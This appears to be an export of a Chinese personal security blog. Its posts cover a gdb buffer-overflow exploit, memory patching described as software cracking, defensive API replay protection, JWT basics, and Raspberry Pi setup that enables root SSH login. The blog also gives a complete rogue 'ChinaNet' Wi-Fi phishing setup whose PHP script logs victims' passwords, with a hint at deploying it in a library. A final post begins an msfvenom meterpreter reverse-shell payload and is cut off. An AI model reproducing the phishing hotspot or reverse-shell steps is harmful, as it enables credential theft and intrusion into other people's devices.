0x080484a9(gdb) 可以看到寄存器中有4个41，因为A的ASCII码对应的就是41，我们传入4个A就会有4个41。 在命令行中输入14个A重新运行，然后再次到达13行断点位置，查看寄存器内容为了方便操作，这里使用perl语言输出数据配合运行123456789101112131415(gdb) r `perl -e 'print "A"x14'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/桌面/main `perl -e 'print "A"x14'`Breakpoint 2, main (argc=2, argv=0xffffd084) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd27f 'A' &lt;repeats 14 times&gt;) at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf90: 0xffffffff 0x4141002f 0x41414141 0x414141410xffffcfa0: 0x41414141 0xf7fb8000 0xffffcfd8 0x080484a9(gdb) 可以看到寄存器中已经有14个A的ASCII码值41了，除此之外，还可以看到call指令下面的指令地址0x080484a9也在寄存器中了,我们要做的就是覆盖这个地址，只要将这个地址修改为hello函数所在的地址，那么程序就会 执行hello函数。通过观察发现，要用A覆盖满底下的寄存器数据，还需要12个A，也就是总共需要26个A才能全部覆盖。在命令行中输入26个A重新运行，然后再次到达13行断点位置，查看寄存器内容。123456789101112131415(gdb) r `perl -e 'print "A"x26'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/桌面/main `perl -e 'print "A"x26'`Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd200 "\027") at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf80: 0xffffffff 0x4141002f 0x41414141 0x414141410xffffcf90: 0x41414141 0x41414141 0x41414141 0x41414141(gdb) 可以看到26个A已经把最后的数据全部覆盖了，我们要做的是让程序执行到hello函数，所以我们只需要22个A并且加上hello函数的首地址。通过调试可知hello函数的首地址是0x0804843b,我们使用perl对地址进行格式化输出，需要将这个16进制地址由后向前每两位进行一个\x拼接，得到的内容是 \x3b\x84\x04\x08。 在命令行中输入22个A加上hello函数地址重新运行,一路输入n单步运行。12345678910111213141516171819202122232425(gdb) r `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/桌面/main `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd200 "\027") at main.c:1313 printf("%s\n", buf);(gdb) nAAAAAAAAAAAAAAAAAAAAAA;�14 return 0;(gdb) n15 &#125;(gdb) nhello () at main.c:55 &#123;(gdb) n6 printf("hello\n");(gdb) nhello7 &#125;(gdb) n 可以看到上面的程序已经执行到hello函数了，我们可以输入q命令退出调试。 为了验证缓冲区溢出漏洞，我们现在直接运行程序，后面跟上我们之前调试分析时得到的结论数据进行运行。1234lanshiqin@lanshiqin-Parallels-Virtual-Platform:~/桌面$ ./main `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`AAAAAAAAAAAAAAAAAAAAAA;�hello段错误 (核心已转储) 可以看到程序调用了hello函数，并且成功输出了hello。虽然最后提示程序段错误，但是我们已经成功的通过让程序接收数据的缓冲区溢出，改变了程序的执行逻辑，执行了其他函数。 如果这是个具有网络通信功能的程序，通过缓冲区漏洞可以使攻击者远程执行任意代码，得到目标系统的控制权。缓冲区溢出攻击成为远程攻击的主要手段，攻击者通过目标ip地址扫描计算机的开放的端口，并对端口程序进行缓冲区溢出攻击，如果这个端口的程序存在缓冲区漏洞，那么这台计算机将会被攻陷。 防范部分：现代操作系统对缓冲区溢出攻击做了防范，比如ASLR(地址空间布局随机化),是参与保护缓冲区溢出问题的一个计算机安全技术。是为了防止攻击者在内存中能够可靠地对跳转到特定利用函数。ASLR包括随机排列程序的关键数据区域的位置，包括可执行的部分、堆、栈及共享库的位置。 缓冲区溢出普遍存在于旧版系统等程序上，比如Windows xp的pop3服务就存在缓存区溢出漏洞，通过该漏洞可以注入shellocode,拿到控制权进行任意操作，比如开启3389端口添加用户等操作，随后就可以通过添加的用户进行远程登录，Windows XP 系统目前在国内的学校和一些政府机构依然在使用，下一个实验内容我将会记录如何通过缓冲区溢出漏洞 远程入侵操作系统。]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>逆向 汇编 实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World 的漏洞]]></title>
    <url>%2Fd7e81382%2F</url>
    <content type="text"><![CDATA[任何程序都有漏洞，包括简单的 Hello World程序，这是一个客观存在的事实。也许你会质疑，一个用C/C++语言编写的输出一句 Hello World 的程序漏洞在哪里？实际上，程序漏洞不一定全部都来自代码逻辑，漏洞还发生在程序运行时期。通过技术手段干扰程序执行，使程序不能得到预期的执行结果，那么这个程序就出现了漏洞。 分析者在没有程序源代码的情况下，只能通过逆分析程序的漏洞，常规操作通常是找到程序的入口点，进一步跟踪程序的调用逻辑和数据，通过修改其中的调用或者数据，使程序出现漏洞。 要做的事： 用C/C++编写一个输出”Hello,World!”的可执行的exe程序。 在程序运行期间修改内存中的数据，使程序输出 “Hi,lanshiqin” 使用的工具： VisualStudio Ollydbg 为了减小篇幅，不再啰嗦怎么创建项目，直接上代码经典的 Hello，World！源代码如下：123456789#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char* argv)&#123; printf("Hello,World!\n"); system("pause"); return 0;&#125; 将程序编译成可执行程序 HelloWorld.exe 并运行可以看到程序按源代码所编写的语句执行，得到了预期的输出结果。 也许有人会问，我直接修改程序的源代码，然后再编译成可执行程序运行，就可以得到想要的输出结果了，为什么要用反汇编工具调试这么麻烦？ 因为我们日常使用的绝大多数软件都是软件公司或者其他个人开发者的产品，我们不是这些软件的开发者，所以我们没有这些软件的源代码，所以只能通过逆向来对程序进行分析。在互联网上我们可以看到有很多正版的收费软件有对应的破解版，这些破解版软件就是有人通过逆向找到程序入口并修改其中的数据，通过程序逻辑漏洞或者运行时期的漏洞对软件进行破解。 一个程序要被CPU执行，首先需要先被载入内存中，我们想要达到修改程序的预期输出结果，就需要找到这块内存并修改其中的数据，以达到我们的目的。 逆向工具在Windows平台的逆向领域中，有两个很好用的工具，一个是Ollydbg(简称OD),经常用来做动态调试，另一个是IDA 经常被用来静态分析。OD用来调试运行时期的程序，可以将CPU执行的机器指令反成汇编指令，可以实时断点查看当前执行的指令，这对分析一些病毒的行为很有用，可以细微到每一条指令的调用，分析出程序具体做了什么。IDA 主要用来分析复杂的代码，通过可执行程序可以得到伪代码，对于一些高级语言编写的程序甚至可以得到近似于程序的源代码，这样就很方便去查找程序里的逻辑漏洞。OD和IDA这两个工具是逆向领域的倚天剑和屠龙刀，具体介绍和功能使用可以查阅相关文档。 操作步骤1.使用OD来打开HelloWorld.exe此时程序还没执行到输出“Hello，World！”的语句，此时是程序刚刚被载入内存，OD界面上可以看到程序当前执行的指令 2.组合键 Alt+M，打开 Memory map 窗口，这是程序运行时的内存数据 3.组合键 Ctrl+B, 搜索内存中的数据ASCII码这里输入要需要替换的“Hello,World!”,底下HEX+00这里是对应ASCII码字符的十六进制数据。 4.点击搜索，可以看到如下图所示，已经搜索到了数据。可以看到对应的内存地址，HEX dump 和ASCII 5.组合键Ctrl+E, 或者点击Edit-&gt;Binary edit 对内存数据进行编辑将ASCII码的“Hello,World!”修改成“Hi,lanshiqin”，点击OK 6.继续运行程序，可以看到控制台输出了 “Hi,lanshiqin”。通过修改程序运行时的内存数据，我们已经成功的改变了程序的预期结果。 通过运行时调试只能影响程序当前运行的结果，如果要影响每次运行的结果，我们可以将此次修改的指令和数据保存成新的可执行程序，以补丁包的形式附加成一个目标程序。（在没有程序源代码的情况下，这种做法相当于达到软件破解的目的，这个补丁相当于破解补丁，功能是使程序输出Hi,lanshiqin） 现在已经证实了，所有程序都有漏洞，包括仅仅是输出一句 “Hello,World!”的程序。 所以，很多程序为了防止被破解，通常都使用了代码混淆，程序加壳等保护措施。这些措施可以加大程序被破解的难度，但是仍然存在漏洞。代码混淆后编译使分析者很难读懂代码，程序加壳主要是为了程序的保护，防止分析者找到程序的入口点。 对于代码混淆，可以在一定程度上防止自己的程序被人还原出源代码，目前的APP应用程序，通常是为了防止应用被抄袭，这点混淆就很有用，因为分析者花费大量精力来分析还原出一个程序的工作量，都可以够他重新写出好几个新的程序了。但是混淆后程序行为依然可以被轻易的分析，所有的程序运行时都需要先被载入内存，然后被CPU执行，分析者可以通过CPU的执行指令进行调试分析，可以对运行时的内存进行分析，进一步修改内存数据，达到破解目的，比如这是个木马APP,安全人员可以跟踪这个程序，分析出这个程序究竟做了什么。 对于程序加壳，通常可以去壳，然后再找程序的入口点。程序的启动过程和入口点是一个比较大的话题，通过C/C++编写的 Hello World 程序逆向分析发现， 程序的入口点并不是main()函数。教科书为了易于理解，通常都告诉我们程序的入口点是main()函数，这是在代码逻辑的角度看。如果从程序执行的角度来看，程序的入口点并不是main()函数。入口点其实是一个地址。入口点地址不是main()函数的开端，而是另一段来自运行时的代码。通过前面的OD分析HelloWorld.exe可执行程序，我们发现程序并不是从Main函数开始执行的，教科书上所谓的“入口地址Main函数“其实也是一个参数，需要被别人调用。对于逆向寻找程序入口点 不再记录笔记，因为已经有人写了很好的文章：https://bbs.pediy.com/thread-216976.htm使用VisualStudio断点调试HelloWorld的源代码在调用堆栈窗口可以看到函数调用关系，打开mainCRTStartup，可以看到如下图所示：可以发现有这么一句赋值语句，mainret = main(argc, argv, envp);main函数作为参数赋值给了mainret变量。在微软的Windows操作系统上，可执行程序c中提供了mainCRTStartup(）运行配置函数，里面包含了程序运行需要的库以及相关的存储资源，在配置完成后，调用 mainret = main(argc, argv, envp); 这条语句所以main并不是程序的入口，main只是作为普通的函数。 计算机程序最终都需要在计算机上运行，程序本身可能存在逻辑漏洞，执行程序的计算机硬件也存在被干扰的可能。我们对程序的定义是：程序是可以被计算机执行的指令集合。从虚拟的数学逻辑到现实的物理化学，我们可以通过一切已知的工具和未知的技术手段去寻找程序的漏洞，所以受外界条件的影响，任何程序都有漏洞，程序漏洞永远存在。]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>逆向 汇编 实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[API接口防止参数篡改和重放攻击]]></title>
    <url>%2Fef4382ec%2F</url>
    <content type="text"><![CDATA[API重放攻击（Replay Attacks）又称重播攻击、回放攻击。他的原理就是把之前窃听到的数据原封不动的重新发送给接收方。HTTPS并不能防止这种攻击，虽然传输的数据是经过加密的，窃听者无法得到数据的准确定义，但是可以从请求的接收方地址分析出这些数据的作用。比如用户登录请求时攻击者虽然无法窃听密码，但是却可以截取加密后的口令然后将其重放，从而利用这种方式进行有效的攻击。 所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，重放攻击是计算机世界黑客常用的攻击方式之一。 一次HTTP请求，从请求方到接收方中间要经过很多个路由器和交换机，攻击者可以在中途截获请求的数据。假设在一个网上存款系统中，一条消息表示用户支取了一笔存款，攻击者完全可以多次发送这条消息而偷窃存款。 重放是二次请求，如果API接口没有做对应的安全防护，将可能造成很严重的后果。 API接口常见的安全防护要做的主要有如下几点： 防止sql注入 防止xss攻击 防止请求参数被串改 防止重放攻击 主要防御措施可以归纳为两点： 对请求的合法性进行校验 对请求的数据进行校验 防止重放攻击必须要保证请求仅一次有效需要通过在请求体中携带当前请求的唯一标识，并且进行签名防止被篡改。所以防止重放攻击需要建立在防止签名被串改的基础之上。 请求参数防篡改采用https协议可以将传输的明文进行加密，但是黑客仍然可以截获传输的数据包，进一步伪造请求进行重放攻击。如果黑客使用特殊手段让请求方设备使用了伪造的证书进行通信，那么https加密的内容也将会被解密。在API接口中我们除了使用https协议进行通信外，还需要有自己的一套加解密机制，对请求参数进行保护，防止被篡改。过程如下： 客户端使用约定好的秘钥对传输参数进行加密，得到签名值signature，并且将签名值也放入请求参数中，发送请求给服务端 服务端接收客户端的请求，然后使用约定好的秘钥对请求的参数（除了signature以外）再次进行签名，得到签名值autograph。 服务端对比signature和autograph的值，如果对比一致，认定为合法请求。如果对比不一致，说明参数被篡改，认定为非法请求。 因为黑客不知道签名的秘钥，所以即使截取到请求数据，对请求参数进行篡改，但是却无法对参数进行签名，无法得到修改后参数的签名值signature。签名的秘钥我们可以使用很多方案，可以采用对称加密或者非对称加密。 防止重放攻击基于timestamp的方案每次HTTP请求，都需要加上timestamp参数，然后把timestamp和其他参数一起进行数字签名。因为一次正常的HTTP请求，从发出到达服务器一般都不会超过60s，所以服务器收到HTTP请求之后，首先判断时间戳参数与当前时间相比较，是否超过了60s，如果超过了则认为是非法的请求。 一般情况下，黑客从抓包重放请求耗时远远超过了60s，所以此时请求中的timestamp参数已经失效了。如果黑客修改timestamp参数为当前的时间戳，则signature参数对应的数字签名就会失效，因为黑客不知道签名秘钥，没有办法生成新的数字签名。 但这种方式的漏洞也是显而易见的，如果在60s之后进行重放攻击，那就没办法了，所以这种方式不能保证请求仅一次有效。 基于nonce的方案nonce的意思是仅一次有效的随机字符串，要求每次请求时，该参数要保证不同，所以该参数一般与时间戳有关，我们这里为了方便起见，直接使用时间戳的16进制，实际使用时可以加上客户端的ip地址，mac地址等信息做个哈希之后，作为nonce参数。我们将每次请求的nonce参数存储到一个“集合”中，可以json格式存储到数据库或缓存中。每次处理HTTP请求时，首先判断该请求的nonce参数是否在该“集合”中，如果存在则认为是非法请求。 nonce参数在首次请求时，已经被存储到了服务器上的“集合”中，再次发送请求会被识别并拒绝。nonce参数作为数字签名的一部分，是无法篡改的，因为黑客不清楚token，所以不能生成新的sign。 这种方式也有很大的问题，那就是存储nonce参数的“集合”会越来越大，验证nonce是否存在“集合”中的耗时会越来越长。我们不能让nonce“集合”无限大，所以需要定期清理该“集合”，但是一旦该“集合”被清理，我们就无法验证被清理了的nonce参数了。也就是说，假设该“集合”平均1天清理一次的话，我们抓取到的该url，虽然当时无法进行重放攻击，但是我们还是可以每隔一天进行一次重放攻击的。而且存储24小时内，所有请求的“nonce”参数，也是一笔不小的开销。 基于timestamp和nonce的方案nonce的一次性可以解决timestamp参数60s的问题，timestamp可以解决nonce参数“集合”越来越大的问题。防止重放攻击一般和防止请求参数被串改一起做，请求的Headers数据如下图所示。 我们在timestamp方案的基础上，加上nonce参数，因为timstamp参数对于超过60s的请求，都认为非法请求，所以我们只需要存储60s的nonce参数的“集合”即可。API接口验证流程：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 获取tokenString token = request.getHeader("token");// 获取时间戳String timestamp = request.getHeader("timestamp");// 获取随机字符串String nonceStr = request.getHeader("nonceStr");// 获取请求地址String url = request.getHeader("url");// 获取签名String signature = request.getHeader("signature");// 判断参数是否为空if (StringUtils.isBlank(token) || StringUtils.isBlank(timestamp) || StringUtils.isBlank(nonceStr) || StringUtils.isBlank(url) || StringUtils.isBlank(signature)) &#123; //非法请求 return;&#125;//验证token有效性，得到用户信息UserTokenInfo userTokenInfo = TokenUtils.getUserTokenInfo(token);if (userTokenInfo == null) &#123; //token认证失败（防止token伪造） return;&#125;// 判断请求的url参数是否正确if (!request.getRequestURI().equals(url))&#123; //非法请求 (防止跨域攻击) return;&#125;// 判断时间是否大于60秒if(DateUtils.getSecond()-DateUtils.toSecond(timestamp)&gt;60)&#123; //请求超时(防止重放攻击) return;&#125;// 判断该用户的nonceStr参数是否已经在redis中if (RedisUtils.haveNonceStr(userTokenInfo,nonceStr))&#123; //请求仅一次有效（防止短时间内的重放攻击） return;&#125;// 对请求头参数进行签名String stringB = SignUtil.signature(token, timestamp, nonceStr, url,request);// 如果签名验证不通过if (!signature.equals(stringB)) &#123; //非法请求（防止请求参数被篡改） return;&#125;// 将本次用户请求的nonceStr参数存到redis中设置60秒后自动删除RedisUtils.saveNonceStr(userTokenInfo,nonceStr,60);//开始处理合法的请求 基于以上的方案就可以做到防止API接收的参数被篡改和防止API请求重放攻击。]]></content>
      <categories>
        <category>API</category>
      </categories>
      <tags>
        <tag>API 后端 安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSON WEB TOKEN]]></title>
    <url>%2Fb2d6036c%2F</url>
    <content type="text"><![CDATA[Json web token (JWT) 是一种基于JSON的开放标准。为了在网络应用环境间传递声明，该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于身份认证。 1.基本概念 Token和Session的区别 基于Session的认证http协议是一种无状态协议，用户在登录时向服务端提供用户名和密码进行用户认证，下一次请求时，用户还要再一次进行用户认证才行，因为http协议是无状态的，服务器并不知道是哪个用户发出的请求。为了让服务端能识别是哪个用户发出的请求，服务端需要在用户登录时存储一份用户登录的信息，该信息由Session值来标识，服务端生成Session后将SessionId作为登录的响应数据传递给浏览器，让浏览器保存为cookie，方便下次请求时发送给服务端，这样服务器就能识别是来自哪个用户的请求了。 Session认证暴露的问题 资源开销：每个用户进行登录认证，服务端应用做一次记录，方便用户下次请求的鉴别，为了能够快速响应用户请求，通常需要把session保存在内存中，而随着认证用户的增加，服务端的开销会明显增大。 扩展性：用户登录认证记录被保存在当前服务端中，意味着用户下次请求还必须要在这台服务器上才能拿到授权的资源。随着用户并发的增大，web应用如果要扩展成分布式应用，采用session的认证将会变得很难扩展，虽然可以用redis来做分布式session共享，但是还是占用了相当大的内存开销。 CSRF：因为是基于cookie来进行用户识别的，如果cookie被截获，就会很容易受到跨站请求伪造的攻击。 基于Token的认证基于token的认证不需要在服务端保存用户的认证信息或者会话信息，该认证机制的应用不需要考虑用户在哪一台服务器登录，为应用的扩展提供了便利。 鉴权流程 客户端使用用户名和密码进行登录请求 服务端接收用户的登录请求，进行用户信息的认证 服务端为认证通过的用户生成token，在登录请求的响应体里返回给客户端 客户端存储登录时的token，并在每次请求服务端时附带上存储的token 服务端验证token值并返回数据。 这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。 2. 基础知识JWT长什么样？以下是一段JWT字符串示例1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ.QzO3RdsVgG4MxikyFDXt55jIjnjAPF49vvPL_fUd_KQ JWT的结构JWT由以下三个部分组成 HEADER:（头部，生成算法和token类型，算法一般是，token类型这里是jwt） PAYLOAD: (有效载荷, 这里存放一些要传输的数据) VERIFY SIGNATURE （签名验证） 三个部分用符号 . 连接起来，构成了JWT字符串，格式如下所示1xxxxx.yyyyy.zzzzz headerjwt的头部承载两部分信息： 声明类型，这里是jwt 声明加密的算法 通常直接使用 HMAC SHA256完整的头部就像下面这样的JSON：1234&#123; "alg": "HS256", "typ": "JWT"&#125; 然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 playload载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分 标准中注册的声明 公共的声明 私有的声明标准中注册的声明 (建议但不强制使用) ： iss: jwt签发者 sub: jwt所面向的用户 aud: 接收jwt的一方 exp: jwt的过期时间，这个过期时间必须要大于签发时间 nbf: 定义在什么时间之前，该jwt都是不可用的. iat: jwt的签发时间 jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。 公共的声明 ：公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密. 私有的声明 ：私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。 定义一个payload:12345&#123; "sub": "1234567890", "name": "lanshiqin", "admin": true&#125; 然后将其进行base64加密，得到Jwt的第二部分。1eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ signaturejwt的第三部分是一个签证信息，这个签证信息由三部分组成： header (base64后的) payload (base64后的) secret这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。最终的JWT：1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ.QzO3RdsVgG4MxikyFDXt55jIjnjAPF49vvPL_fUd_KQ 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。 如何应用一般是在请求头里加入Authorization，并加上Bearer标注：123headers: &#123; 'Authorization': 'Bearer ' + token &#125; 服务端会验证token，如果验证通过就会返回相应的资源。整个流程如下图所示： 总结 优点 因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。 因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。 便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。 它不需要在服务端保存会话信息, 所以它易于应用的扩展 安全相关 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。 保护好secret私钥，该私钥非常重要。 如果可以，请使用https协议]]></content>
      <categories>
        <category>API</category>
      </categories>
      <tags>
        <tag>API 后端 安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派搭建钓鱼wifi热点]]></title>
    <url>%2F5c639cc1%2F</url>
    <content type="text"><![CDATA[我们连接的公共wifi其实是非常不安全的网络，骇客可以利用wifi路由设备进行中间人攻击，劫持DNS伪造钓鱼网站。接下来我会做个简单的实验，伪造中国电信的路由ChinaNet并发射出热点wifi等待别人连接，从而达到获取用户的手机账户和密码的目的。本记录仅供个人学习交流使用，请勿用于非法用途。 本次仅搭建热点进行设备引流，不做中间人攻击，而是简单的跳转到伪造的ChinaNet页面，等待连接的设备输入用户名和密码进行存储。 需要安装两个软件，并且做一些配置hostapd(用于提供无线共享,创建wifi热点)dnsmasq(用于配置DNS和DHCP的工具,可以对接入热点的设备进行流量引导) 1.安装 hostapd1apt-get install hostapd 2.编辑hostapd配置文件1vim /etc/hostapd/hostapd.conf 配置内容如下12345678910111213141516#Wifi接口名称,使用树莓派内置的无线网卡wlan0interface=wlan0#wifi热点网络名称，其他设备搜索到的wifi名称ssid=ChinaNet#频道设置为6channel=6#接受所有MAC地址macaddr_acl=0#忽略ssid广播，需要客户端知道网络名称ignore_broadcast_ssid=0#树莓派3的驱动driver=nl80211#使用2.4GHZ波段hw_mode=g#开启VMMwmm_enabled=1 3.编辑hostapd的默认守护进程配置文件1vim /etc/default/hostapd 添加配置内容1DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot; 4.编辑网络接口配置1vim /etc/network/interfaces 配置内容如下：123456allow-hotplug wlan0iface wlan0 inet static address 172.24.1.1 netmask 255.255.255.0 network 172.24.1.0 broadcast 172.24.1.255 5.安装dnsmasq1apt-get install dnsmasq 6.编辑dnsmasq配置文件1vim /etc/dnsmasq.conf 配置内容如下：1234567interface=wlan0listen-address=172.24.1.1bind-interfacesserver=8.8.8.8domain-neededbogus-privdhcp-range=172.24.1.50,172.24.1.150,12h 7.编辑rc.local文件，在exit0 上方添加1iptables-restore &lt; /etc/iptables.ipv4.nat 8.依次执行下列命令12345sudo sh -c "echo 1 &gt; /proc/sys/net/ipv4/ip_forward"sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPTsudo sh -c "iptables-save &gt; /etc/iptables.ipv4.nat" 9.启动hostapd和dnsmasq12sudo service hostapd startsudo service dnsmasq start 10.重启系统1reboot 11.编写钓鱼网站程序将自己的电脑先连接到中国电信的路由器ChinaNet网络上，并且将认证网页下载到本地。修改认证网页的提交表单地址，可以提交给自己的远程服务器，也可以提交到本地。这里我使用提交提交到本地的方式，将表单提交给一个php程序来处理。登录认证页面12345678&lt;!--省略部分代码--&gt;...&lt;form action="login.php" method="post" onsubmit="return false;" id="formCh"&gt; &lt;input name="userName" id="userName3" type="text" class="input_txt" value=""&gt; &lt;input name="password" id="password3" type="password" autocomplete="off" class="input_txt" value=""&gt; &lt;input type="image" src="./dlu.png" onclick="if(!this.disabled) return checkLogin3();"&gt;&lt;/form&gt;... 处理程序login.php123456789101112&lt;?php$userName = $_POST['userName']; // 获取用户名$password = $_POST['password']; // 获取密码// 以追加内容的方式打开pass.txt文件$myfile = fopen("pass.txt","a");// 要保存的数据：用户名 密码 当前时间$info = "userName=$userName passWord=$password \t".date("Y-m-d H:i:s")." \n";// 写入文件fwrite($myfile,$info);// 关闭文件流fclose($myfile); 由于之前已经搭建好了LNMP的环境，自己将编写好的web程序放到/var/www/html路径下即可。php程序要给可执行权限才能操作磁盘文件进行读写，为了方便我们之间将整个html文件夹下的文件都设置为可执行切换到/var/www/下 执行 chmod 777 html/* 12.打开手机，即可看到树莓派发出的ChinaNet网络 连接上后可以看到树莓派为连接上热点的wifi分配了ip地址 打开浏览器，随便输入一个url地址，都将被重定向到我们的钓鱼页面 用户输入用户名和密码后点击提交，将会执行指定的php程序 打开网页所在的文件夹下查看pass.txt文件，可以看到用户和密码以及登录时间 到此简单的钓鱼wifi就制作完成了。树莓派+移动电源+Wi-Fi模块+大黑背包+一个人来人往的图书馆+将Wi-Fi名字设置为ChinaNet。你懂的]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈 树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派-极客的玩具]]></title>
    <url>%2Fa7058afb%2F</url>
    <content type="text"><![CDATA[树莓派是一台只有信用卡大小的计算机。树莓派无所不能，可以用来学习编程，可以用来作为web服务器，家庭媒体中心，无人机，天气预报站等等…前不久买了RASPBERRY PI 3 MODEL B，传说中的树莓派3代。和之前的树莓派2代比起来有了明显的性能提升，树莓派2代已经被我折腾坏了，对比2代发现3代树莓派内置了蓝牙和WIFI，简直激动人心。 树莓派3内置了蓝牙和wifi，并且有摄像头和AV接口，4个USB接口和一个网络接口，显示接口和HDMI。 1GB的RAM加上40个GPIO,可以非常方便的控制外设硬件，简直无所不能。 在树莓派系统上root账号是被锁定的，并且不允许远程登录。我们需要先为root账号设置密码，配置允许远程登录，解锁root账户即可。为root账户设置密码1sudo passwd root 配置允许远程登录1sudo nano /etc/ssh/sshd_config 修改 PermitRootLogin without-password 为 PermitRootLogin yes 解锁root账户1sudo passwd --unlock root 重启后即可用root账户登录 接下来做一些升级12apt-get updateapt-get upgrade --show-upgraded 安装vim,方便后续修改文件用的编辑器1apt-get install vim 接下来搭建LNMP安装nginx1apt-get install nginx 安装php7.01apt-get install php7.0 php7.0-mysql php7.0-fpm php7.0-cli php7.0-curl php7.0-gd php7.0-mcrypt 安装mysql1apt-get install -y mysql-client mysql-server 修改nginx配置，让nginx支持php1vim /etc/nginx/sites-enabled/default 12345678910# pass PHP scripts to FastCGI server # location ~ \.php$ &#123; include snippets/fastcgi-php.conf; # With php-fpm (or other unix sockets): fastcgi_pass unix:/var/run/php/php7.0-fpm.sock; # With php-cgi (or other tcp sockets): # fastcgi_pass 127.0.0.1:9000; &#125; 123service php7.0-fpm restartservice nginx restartservice mysqld restart 切换到服务器web根目录，新建index.php12cd /var/www/html/vim index.php 内容如下1&lt;?php phpinfo(); ?&gt; 打开浏览器输入地址,访问index.php]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[入侵Windows操作系统]]></title>
    <url>%2F11219b9e%2F</url>
    <content type="text"><![CDATA[我将演示我是如何使用Kali Linux系统来入侵 Windows7操作系统。通过渗透拿到shell执行cmd命令，可以轻易的在目标主机上创建和删除文件，并且打开对方的摄像机进行录像拍照。本教程仅供个人学习交流使用，请勿用于非法用途。 Windows操作系统是目前使用人数最多的桌面级操作系统，而目前95%以上的服务器操作系统用的是Linux系统，两大系统都在各自的应用领域占据着半壁江山。黑客主要攻击的目标一般就是针对个人用户的Windows攻击和针对Linux服务器的攻击。苹果的MacOS系统属于Unix系统的一个分支，Unix商业系统是收费的，之所以Mac卖的这么贵可以看做有一部分是操作系统的价钱。虽然苹果的笔记本使用人数的比例没有Windows那么多，但是和很多程序员喜欢用MacBookPro编程一样，很多黑客也喜欢用苹果笔记本来搞渗透测试。由于轻薄携带方便，随拿随走正常办公可以续航一天，每天充电维持甚至有的人从来不关机，因此也受到很多商务人士的青睐。毕竟质量摆在这，所以我也买了一台MacBookPro，至今已经将近2年了，纪念一下当时刚买不久的mac 废话不多说，接下来要进行渗透攻击，先说明这里用到的设备和系统，MacBookPro一台 （可以是其他电脑）为了测试方便，在虚拟机中分别安装了： Kali Linux 操作系统（用来做渗透使用的攻击系统） Windows7 操作系统 (用来做肉鸡测试的被攻击的系统) 1.打开Kali Linux操作系统，可以在终端输入 ifconfig查看当前系统的ip地址，该地址用于目标主机的渗透程序反向连接到自己 2.使用msfvenom制作渗透程序（下列的ip地址是我Kali Linux系统当前的ip地址，根据自己的实际情况设置）1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=6666 